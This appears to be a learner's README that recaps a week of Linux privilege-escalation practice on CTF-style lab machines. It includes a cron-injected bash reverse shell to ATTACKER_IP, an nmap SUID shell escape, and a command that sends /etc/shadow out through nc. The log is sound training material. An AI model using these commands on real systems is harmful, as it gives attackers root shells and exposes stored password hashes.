# 🧠 HackMalayali – Linux Privilege Escalation

This week focused entirely on **Linux privilege escalation** using real CTF-style boxes and hands-on tools.

> ✅ Rooted multiple machines  
> ⚙️ Gained deep understanding of privilege escalation  
> 🛠 Built a real-world hacker workflow  


## 🔥 Week Overview

| Day | Focus | Key Techniques | Rooted? |
|-----|-------|----------------|---------|
| Day 1 | Manual Enumeration | `uname`, `id`, `ifconfig`, `/etc/passwd` | ✅ |
| Day 2 | Writable files & simple SUID | `find`, `nano`, `nmap` | ✅ |
| Day 3 | Process monitoring | `pspy`, `awk`, reverse shell injection | ✅ |
| Day 4 | Cronjob injection | `at`, `base64`, shadow file read | ✅ |
| Day 5 | Manual exploitation + review | Scheduled tasks & script abuse | ✅ |
| Day 6 | Final privesc test | Enumeration + SUID + `getcap` | ✅ |
| Day 7 | Capability abuse & wrap-up | `cap_net_bind_service`, `find`, fallback hunting | ✅ |


## 🔧 Tools Used

- 🔍 `find` – discover writable or SUID files
- 🕵️ `pspy` – watch real-time cron jobs & scheduled tasks
- 📡 `nmap`, `nc` – local port and network analysis
- ✍️ `nano`, `awk`, `at`, `crontab` – system commands & cron injection
- 🔓 `getcap` – capability abuse
- 🐚 `bash`, `python`, `perl` – reverse shell tricks
- 📁 `base64`, `/etc/shadow` – reading protected files


## 📁 Root Access Highlights

### ✅ Reverse Shell via Cronjob
```bash
echo '* * * * * root bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"' >> /etc/crontab
```

### ✅ SUID `nmap` Privilege Escalation
```bash
nmap --interactive
!sh
```

### ✅ `pspy` Catches Task Running Every 60 Seconds
```bash
/tmp/update.sh  # Writable by low-priv user
```

### ✅ Read `/etc/shadow` via `base64`
```bash
base64 /etc/shadow | nc ATTACKER_IP 4444
```


## 🧠 What I Learned

- Enumeration is **everything**
- SUID and cron jobs are **root goldmines**
- Tools like `pspy` and `getcap` reveal **hidden misconfigurations**
- Hands-on labs = fastest way to learn real hacking


## 📅 Next Up: Week 3

Windows Privilege Escalation:
- Local exploits
- Service abuse
- Registry persistence
- PowerShell automation


### 📌 Author
**Sanin (HackMalayali)**  
🎥 YouTube: [HackMalayali](https://youtube.com/@hackmalayali)
📂 GitHub: [github.com/saninzx](https://github.com/saninzx)